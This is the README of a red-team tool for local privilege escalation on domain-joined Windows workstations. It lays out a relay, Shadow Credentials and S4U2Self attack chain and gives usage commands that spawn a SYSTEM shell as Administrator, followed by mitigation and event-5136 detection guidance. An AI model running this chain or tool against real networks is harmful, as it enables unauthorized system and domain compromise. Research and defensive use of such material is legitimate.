# WebClientRelayUp

> Created by Raphaël HUON @Hack0ura, Purple Teamer at [Advens](https://www.linkedin.com/company/advens/)

> https://www.advens.com/


**This is basically an universal no-fix local privilege escalation in domain-joined windows workstations in default configuration.**  

**Tested on Windows 10 and 11**


This project is based on [DavRelayUp](https://github.com/Dec0ne/DavRelayUp). The main difference is that I implemente Shadow Credentials + S4U2Self, which were not available with DavRelayUp (only RBCD is supported, which relies on creating a new computer account (MAQ!=0) or having compromised a service account).

How does it work ?

1. Force-start the WebClient service (if not already running) (No admin account needed! :))
2. Start a HTTP relay server (by default on port 8080)
3. Force SYSTEM to connect to our relay server using MS-EFSR functions ([SharpEfsTrigger](https://github.com/cube0x0/SharpSystemTriggers/tree/main/SharpEfsTrigger)) 
4. Relay the connection to the LDAP service of a domain controller (relaying a machine account)
5. Generate and add a KeyCredential blob into ms-DSKeyCredentialLink attribute of relayed machine account.
6. Use PKINIT to authenticate as the machine account and obtain a TGT for the machine account.
7. Use the TGT to exploit S4U2Self technique to obtain a Service Ticket (ST) on behalf of a domain administrator for SPN HOST.
8. Use the Service Ticket to authenticate to local Service Control Manager and create a new service as NT AUTHORITY/SYSTEM. ([SCMUACBypass](https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82))

## Prerequisites 

- Be in in a domain that supports PKINIT (Domain Controller has to run Windows Server 2016 or above)
- Be in a domain where the Domain Controller(s) has its own key pair (When ADCS is in place or a custom CA is set up)
- WebClient service installed and enabled or in state "Manual Trigger" on the targeted machine.

## Usage
```
╔════════════════════════════════════════════════════════════════╗
║                      WebclientRelayUp                          ║
║                       By @Hack0ura                             ║
╚════════════════════════════════════════════════════════════════╝

Usage: WebClientRelayUp.exe -t <target> -c command [options]

Required Arguments:
  -t, --target <host>                LDAP target server (e.g., dc01.contoso.local)
  -c, --command <cmd>                Command to run as SYSTEM via SCM UAC Bypass
  -d, --domain <domain>              Full domain name of the target (e.g. contoso.local)

Optional Arguments:
  -p, --port <port>                  HTTP port to listen on (default: 8080)
  -u, --user-to-impersonate <user>   The username you want to impersonate (default: Administrator)
  --force                            /!\\ Warning /!\\ Force the change of ms-DSKeyCredentialLink attribute
  -lp, --ldap-port <port>            LDAP port (default: 389, or 636 for LDAPS)
  -s, --ldaps                        Use LDAPS instead of LDAP (default: false)
  -a, --auto                         If used, disable auto-trigger EFS coercion. Enabled by default.
  -v, --verbose                      Enable verbose output
  -h, --help                         Show this help message

 Usage example:
  WebClientRelayUp.exe -t dc01.contoso.local -u Administrator -c cmd.exe
```
New feature ! IPP coerce is now available :

```
WebClientRelayUp.exe -t dc01.contoso.local -u Administrator -c cmd.exe --ipp
```


## Installation

```
dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true /p:EnableCompressionInSingleFile=true /p:PublishTrimmed=true
```
Then go to bin\Release\net8.0\win-x64\publish\, and the binary should be there.

## Usage example

https://github.com/user-attachments/assets/647d85ff-610d-4204-ae30-96b2d9ff888b

## Mitigation

The best way to protect yourself against this kind of technique is to enforce LDAP Signing and LDAP Channel Binding. This mitigates relay-based attacks. This can be configured via the "Domain Controller: LDAP server signing requirements" GPO.

You may disable WebClient service on workstations, but make sure that it is not necessary for some application running on your system.

## Detection

To detect this attack, one approach can be based on Windows event 5136 (A directory service object was modified).

https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5136

The idea to detect a Shadow Credential attack is to identify the operation "Value Added – new value added" on msDS-KeyCredentialLink attribute.

The following "pseudo-code" can be used:

```
WHEN eventID IS "5136"
  AND `AttributeLDAPDisplayName` IS "msDS-KeyCredentialLink"
  AND `OperationType` IS "%%14674"
```


An SACL has to be configured to get the correct event ID on GUID `5b47d60f-6090-40b2-9f37-2a4de88f3063` https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/45916e5b-d66f-444e-b1e5-5b0666ed4d66

## Acknowledgements
* [James Forshaw](https://twitter.com/tiraniddo) for figuring out how to [use Kerberos Service Tickets for LOCAL authentication to Service Manager](https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82). 
* [Cube0x0](https://twitter.com/cube0x0) for his [SharpSystemTriggers](https://github.com/cube0x0/SharpSystemTriggers/tree/main/SharpEfsTrigger) functionality (specifically SharpEfsTrigger) which was used in this project.
* [Will Schroeder](https://twitter.com/harmj0y) and everyone who contributed to [Rubeus](https://github.com/GhostPack/Rubeus/). Helped me a lot to implemented PKINIT.
* [Dec0ne](https://github.com/Dec0ne) for his work on [DavRelayUp](https://github.com/Dec0ne/DavRelayUp), which was a huge inspiration to create this project. 
* [Shutdown](https://github.com/ShutdownRepo) for his work on [pyWhisker](https://github.com/ShutdownRepo/pywhisker), which helped me a lot to implemente ShadowCredentials attack.

## Disclaimer

This privilege escalation tool is released for **educational and research purposes only**, and to help defenders understand Windows domain-joined attack surfaces.
 
**Do NOT use this tool on any system or network without explicit written permission from the owner.**
 
The author(s) bear **no responsibility** for any misuse, damage, or legal consequences resulting from the use of this code.
 
Use at your own risk — and only in authorized environments.
